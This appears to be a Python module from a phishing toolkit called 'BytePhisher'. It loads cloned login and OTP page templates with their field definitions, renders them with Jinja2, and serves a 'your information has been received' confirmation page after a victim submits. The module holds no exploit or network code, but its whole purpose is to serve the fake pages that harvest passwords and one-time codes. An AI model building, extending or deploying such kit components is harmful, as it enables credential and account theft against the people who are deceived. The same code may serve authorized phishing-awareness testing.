# BytePhisher — Jinja2 template rendering for site folders.
# A "site" is a directory: index.html (or login.html), assets, fields.json,
# optional otp.html. We render index.html with Jinja2 so {{ site_name }} etc.
# work. Non-Jinja2 templates (plain HTML) are served as-is with light
# placeholder substitution.
import json
import os

from jinja2 import Environment

_env = Environment(autoescape=True)

def _load_site(site_dir):
    """Return (html, fields) for the site's main page."""
    candidates = ["index.html", "login.html", "index.htm", "login.htm"]
    html_path = None
    for c in candidates:
        p = os.path.join(site_dir, c)
        if os.path.isfile(p):
            html_path = p
            break
    html = ""
    if html_path:
        with open(html_path, encoding="utf-8") as f:
            html = f.read()
    fields = []
    fp = os.path.join(site_dir, "fields.json")
    if os.path.isfile(fp):
        with open(fp, encoding="utf-8") as f:
            fields = json.load(f)
    return html, fields

def _try_jinja(html, site_name):
    """If html contains Jinja syntax, render via Jinja2; else return raw."""
    if "{{" in html or "{%" in html or "{#" in html:
        try:
            tpl = _env.from_string(html)
            return tpl.render(site_name=site_name or os.path.basename(os.getcwd()))
        except Exception:
            # fall back to naive substitution
            return html.replace("{{site_name}}", site_name or "")
    return html

def render_site(site_dir, path, otp=False):
    html, fields = _load_site(site_dir)
    if not html:
        return "<html><body><h1>404 — no index.html in template</h1></body></html>"
    site_name = os.path.basename(os.path.abspath(site_dir))
    if otp and os.path.isfile(os.path.join(site_dir, "otp.html")):
        with open(os.path.join(site_dir, "otp.html"), encoding="utf-8") as f:
            html = f.read()
    return _try_jinja(html, site_name)

def render_thankyou():
    return (
        "<!doctype html><html><head><title>Success</title>"
        "<style>body{font-family:system-ui;min-height:100vh;display:flex;"
        "align-items:center;justify-content:center;background:#f6f7fb;color:#1c1e21;"
        "margin:0}.box{background:#fff;padding:40px 56px;border-radius:12px;"
        "box-shadow:0 8px 30px rgba(0,0,0,.08);text-align:center}h1{font-size:22px;"
        "margin:0 0 8px}p{color:#5c5e62;margin:0}</style></head>"
        "<body><div class='box'><h1>Thank you</h1>"
        "<p>Your information has been received.</p></div></body></html>"
    )
